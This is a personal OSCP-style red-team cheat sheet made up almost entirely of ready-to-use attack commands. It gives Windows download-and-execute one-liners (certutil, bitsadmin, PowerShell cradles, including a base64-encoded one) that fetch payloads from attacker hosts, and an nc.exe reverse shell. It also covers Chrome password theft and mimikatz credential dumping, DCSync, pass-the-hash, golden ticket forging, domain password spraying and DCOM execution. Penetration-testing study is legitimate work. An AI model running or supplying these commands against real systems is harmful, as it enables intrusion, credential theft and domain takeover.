## my OSCP_note

Download & execute

`cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
`

`C:\> PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.178.16:8000/launcher.bat’,’launcher.bat'); Start-Process ‘launcher.bat'`


`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`


`c:\Users\Public>certutil -urlcache -split -f http://10.10.14.20/puckieshell443.ps1`



`PS C:\pentest> certutil.exe -f -split -VerifyCTL http://192.168.178.12/msbuild_nps.xml
CertUtil: -verifyCTL command FAILED: 0x8009310b (ASN: 267 CRYPT_E_ASN1_BADTAG)
CertUtil: ASN1 bad tag value met.`

```markdown

# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd

```

```markdown

 echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  &gt;&gt; webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  &gt;&gt; webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  &gt;&gt; webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  &gt;&gt; webdl.vbs
 timeout 1
 echo xHttp.Send  &gt;&gt; webdl.vbs
 timeout 1
 echo with bStrm      &gt;&gt; webdl.vbs
 timeout 1
 echo   .type = 1 '      &gt;&gt; webdl.vbs
 timeout 1
 echo   .open      &gt;&gt; webdl.vbs
 timeout 1
 echo   .write xHttp.responseBody      &gt;&gt; webdl.vbs
 timeout 1
 echo   .savetofile "C:tempwindows-privesc-check2.exe", 2 '  &gt;&gt; webdl.vbs
 timeout 1
 echo end with &gt;&gt; webdl.vbs
 timeout 1
 echo

```

up my server

# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80


_runas_

`C:\Users\Public> runas /user:HTB\administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.20/puckieshell443.ps1')"`


`c:\Users\Public> runas /user:ACCESS\administrator /savecred "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAwAC8AcAB1AGMAawBpAGUAcwBoAGUAbABsADUAMwAuAHAAcwAxACcAKQA="`


# Command and Control

Simple TCP Port Redirection

```markdown	

	socat TCP-LISTEN:80,fork TCP:<remote host>:80
	socat TCP-LISTEN:443,fork TCP:<remote host>:443
 
```


UDP Port Redirection 

```markdown

	socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<IPADDRESS>; echo -ne
 
```

Simple HTTP Redirect

Save as a file like the following as redirect.html and map to root "/" on your Team Server. Casual browsing to the root of your domain will then simply redirect.

```markdown

	<html>
	<title>Google</title>
	<meta http-equiv="refresh" content="0;url=https://www.googlrrrr.com" />
	</html>
 
```

Dump Google Chrome passwords

```markdown

	shell copy "C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data" C:\users\public\libraries\ld.dat
	
	steal_token <user pid>

	mimikatz @dpapi::chrome /in:C:\users\public\libraries\ld.dat /unprotect
 
 
 
```

## Mimikatz

https://github.com/gentilkiwi/mimikatz/wiki
https://adsecurity.org/?p=2362

Dump Cleartext Credentials

```markdown

	sekurlsa::wdigest
	sekurlsa::logonpasswords
	lsadump::secrets
 
```

Dump cached domain credentials

```markdown

	lsadump::cache
 
```

Format mscachev2 as ```$DCC2$10240#username#hash```

```markdown

	cat 'mscachecreds.txt' | awk -F “:” {'print "$DCC2$10240#"$1"#"$2'}
 
```

Crack mscachev2 format with Hashcat (extremely slow)

```markdown

	./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
 
```

DCSYNC - Remote Hash Dumping from a Domain Controller

```markdown

	mimikatz lsadump::dcsync /user:domain\krbtgt
 
```

- There is also a CS built-in function for this
- Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/

Pass the Hash

```markdown

	mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
 
```

Golden Ticket Creation (File)
```markdown	

	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt:<krbtgthash> /ticket:newadmin.tkt
 
```

Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session

```markdown

	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt:<krbtgthash> /ptt
 
```

To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:

```markdown

	/user:ChildDomainControllerMachineName$  
	/rc4: KRBTGT Hash
	/sid:Child Domain SID
	/domain:FQDN of Child Domain
	/groups:516 
	/sids:ParentSID-516,S-1-5-9 
	/id:ID of Child Domain Controller 
	/ptt
 
```

### DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)

Source: https://github.com/dafthack/DomainPasswordSpray

DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the user list from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

#### Quick Start Guide
Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.
```
	Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.
```

The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.

The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
```
	PowerShell Invoke-DomainPasswordSpray -Password Winter2016
```

The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt
```
	PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

#### Invoke-DomainPasswordSpray Options
```
	UserList          - Optional UserList parameter. This will be generated automatically if not specified.
	Password          - A single password that will be used to perform the password spray.
	PasswordList      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
	OutFile           - A file to output the results to.
	Domain            - A domain to spray against.
```

### Misc Powershell Pasties

List Removeable Drives
```
	Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{"USB_PROCESS_DETECTED: " + $_.ProviderName  + "`n"}
```

Random Execution Method
```
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("visio.application", "system1"))
$docs = $visio.Documents.Add("")
$docs.ExecuteLine('CreateObject("Wscript.Shell").Exec("cmd.exe")')
```
